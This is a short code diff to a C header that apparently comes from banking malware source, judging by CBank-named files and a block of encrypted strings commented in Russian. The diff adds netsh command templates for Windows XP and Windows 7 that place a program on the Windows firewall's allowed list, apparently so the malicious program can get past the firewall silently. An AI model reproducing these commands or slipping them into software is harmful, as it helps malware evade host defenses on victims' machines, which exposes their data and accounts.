@@ -237,6 +237,10 @@ CSSTR CBankFlagUpdate[] = "cbank_flagupdate.txt";
 CSSTR CBankRestFixed[] = "cbank_restfixed.txt"; 
 #endif //BBSCBankH
 
+//команда для добавления в список доверенных браундмаузера
+CSSTR NetshFirewallWinXp[] = "netsh firewall add allowedprogram \"%s\" %s ENABLE"; //для windows XP
+CSSTR NetshFirewallWin7[] = "netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""; //для windows 7
+
 //=============================================================================
 // Конец блока шифрованных строк
 //=============================================================================
